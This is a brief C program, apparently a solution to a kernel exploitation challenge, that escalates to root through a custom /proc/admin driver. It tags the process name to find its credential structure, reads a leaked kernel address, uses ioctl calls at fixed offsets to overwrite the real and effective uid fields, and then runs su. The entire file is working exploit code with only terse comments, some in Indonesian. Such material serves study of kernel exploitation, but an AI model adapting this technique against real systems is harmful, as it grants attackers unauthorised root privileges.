#include <stdio.h>
#include <fcntl.h>
#include <sys/ioctl.h>
#include <unistd.h>
#include <stdlib.h>
#include <string.h>
#include <sys/prctl.h>

int main(){
    int fd;
    prctl(PR_SET_NAME, "AAAAAAAA", 0,0,0); // buat liat gdb -> struct cred
    fd = open("/proc/admin", O_RDWR);
    long addr;
    read(fd, &addr, 8);
    //printf("0x%llx\n", addr); -> x/1000gx <addr>
    ioctl(fd, 0x1001, addr+0x630); // fixed offset
    long fix;
    read(fd, &fix, 8);
    ioctl(fd, 0x1001, fix); // real uid
    ioctl(fd, 0x1002, 0);
    ioctl(fd, 0x1001, fix+16); // current running program uid
    ioctl(fd, 0x1002, 0);
    system("su");
}
